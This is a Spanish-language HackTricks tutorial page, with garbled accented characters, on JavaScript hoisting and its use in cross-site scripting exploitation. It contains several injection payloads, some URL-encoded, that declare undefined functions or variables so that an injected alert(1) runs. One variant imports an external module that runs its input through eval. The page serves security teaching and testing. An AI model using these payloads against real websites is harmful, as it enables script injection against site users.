# Elevaci贸n de JS

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta convertirte en un experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCIN**](https://github.com/sponsors/carlospolop)!
* Obt茅n la [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci贸n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **nete al**  [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s铆gueme** en **Twitter**  [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>

## Informaci贸n B谩sica

En el lenguaje JavaScript, se describe un mecanismo conocido como **Elevaci贸n** donde las declaraciones de variables, funciones, clases o importaciones se elevan conceptualmente hasta la parte superior de su 谩mbito antes de que se ejecute el c贸digo. Este proceso es realizado autom谩ticamente por el motor de JavaScript, que recorre el script en m煤ltiples pasadas.

Durante la primera pasada, el motor analiza el c贸digo para verificar errores de sintaxis y lo transforma en un 谩rbol de sintaxis abstracto. Esta fase incluye la elevaci贸n, un proceso donde ciertas declaraciones se mueven a la parte superior del contexto de ejecuci贸n. Si la fase de an谩lisis es exitosa, indicando que no hay errores de sintaxis, la ejecuci贸n del script contin煤a.

Es crucial entender que:

1. El script debe estar libre de errores de sintaxis para que ocurra la ejecuci贸n. Las reglas de sintaxis deben ser estrictamente seguidas.
2. La ubicaci贸n del c贸digo dentro del script afecta la ejecuci贸n debido a la elevaci贸n, aunque el c贸digo ejecutado puede diferir de su representaci贸n textual.

#### Tipos de Elevaci贸n

Seg煤n la informaci贸n de MDN, existen cuatro tipos distintos de elevaci贸n en JavaScript:

1. **Elevaci贸n de Valor**: Permite el uso del valor de una variable dentro de su 谩mbito antes de su l铆nea de declaraci贸n.
2. **Elevaci贸n de Declaraci贸n**: Permite hacer referencia a una variable dentro de su 谩mbito antes de su declaraci贸n sin causar un `ReferenceError`, pero el valor de la variable ser谩 `undefined`.
3. Este tipo altera el comportamiento dentro de su 谩mbito debido a la declaraci贸n de la variable antes de su l铆nea de declaraci贸n real.
4. Los efectos secundarios de la declaraci贸n ocurren antes de que el resto del c贸digo que la contiene sea evaluado.

En detalle, las declaraciones de funciones exhiben el comportamiento de elevaci贸n del tipo 1. La palabra clave `var` demuestra el comportamiento del tipo 2. Las declaraciones l茅xicas, que incluyen `let`, `const` y `class`, muestran el comportamiento del tipo 3. Por 煤ltimo, las declaraciones `import` son 煤nicas en el sentido de que se elevan con los comportamientos del tipo 1 y tipo 4.

## Escenarios

Por lo tanto, si tienes escenarios donde puedes **Inyectar c贸digo JS despu茅s de que se use un objeto no declarado**, podr铆as **corregir la sintaxis** declar谩ndolo (para que tu c贸digo se ejecute en lugar de arrojar un error):
```javascript
// The function vulnerableFunction is not defined
vulnerableFunction('test', '<INJECTION>');
// You can define it in your injection to execute JS
//Payload1: param='-alert(1)-'')%3b+function+vulnerableFunction(a,b){return+1}%3b
'-alert(1)-''); function vulnerableFunction(a,b){return 1};

//Payload2: param=test')%3bfunction+vulnerableFunction(a,b){return+1}%3balert(1)
test'); function vulnerableFunction(a,b){ return 1 };alert(1)
```

```javascript
// If a variable is not defined, you could define it in the injection
// In the following example var a is not defined
function myFunction(a,b){
return 1
};
myFunction(a, '<INJECTION>')

//Payload: param=test')%3b+var+a+%3d+1%3b+alert(1)%3b
test'); var a = 1; alert(1);
```

```javascript
// If an undeclared class is used, you cannot declare it AFTER being used
var variable = new unexploitableClass();
<INJECTION>
// But you can actually declare it as a function, being able to fix the syntax with something like:
function unexploitableClass() {
return 1;
}
alert(1);
```

```javascript
// Properties are not hoisted
// So the following examples where the 'cookie' attribute doesn麓t exist
// cannot be fixed if you can only inject after that code:
test.cookie('leo','INJECTION')
test['cookie','injection']
```
## M谩s Escenarios
```javascript
// Undeclared var accessing to an undeclared method
x.y(1,INJECTION)
// You can inject
alert(1));function x(){}//
// And execute the allert with (the alert is resolved before it's detected that the "y" is undefined
x.y(1,alert(1));function x(){}//)
```

```javascript
// Undeclared var accessing 2 nested undeclared method
x.y.z(1,INJECTION)
// You can inject
");import {x} from "https://example.com/module.js"//
// It will be executed
x.y.z("alert(1)");import {x} from "https://example.com/module.js"//")


// The imported module:
// module.js
var x = {
y: {
z: function(param) {
eval(param);
}
}
};

export { x };
```

```javascript
// In this final scenario from https://joaxcar.com/blog/2023/12/13/having-some-fun-with-javascript-hoisting/
// It was injected the: let config;`-alert(1)`//`
// With the goal of making in the block the var config be empty, so the return is not executed
// And the same injection was replicated in the body URL to execute an alert

try {
if(config){
return;
}
// TODO handle missing config for: https://try-to-catch.glitch.me/"+`
let config;`-alert(1)`//`+"
} catch {
fetch("/error", {
method: "POST",
body: {
url:"https://try-to-catch.glitch.me/"+`
let config;`-alert(1)-`//`+""
}
})
}
```
## Referencias

* [https://jlajara.gitlab.io/Javascript\_Hoisting\_in\_XSS\_Scenarios](https://jlajara.gitlab.io/Javascript\_Hoisting\_in\_XSS\_Scenarios)
* [https://developer.mozilla.org/en-US/docs/Glossary/Hoisting](https://developer.mozilla.org/en-US/docs/Glossary/Hoisting)
* [https://joaxcar.com/blog/2023/12/13/having-some-fun-with-javascript-hoisting/](https://joaxcar.com/blog/2023/12/13/having-some-fun-with-javascript-hoisting/)

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta convertirte en un h茅roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** 隆Consulta los [**PLANES DE SUSCRIPCIN**](https://github.com/sponsors/carlospolop)!
* Obt茅n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci贸n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **nete al**  [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s铆gueme** en **Twitter**  [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
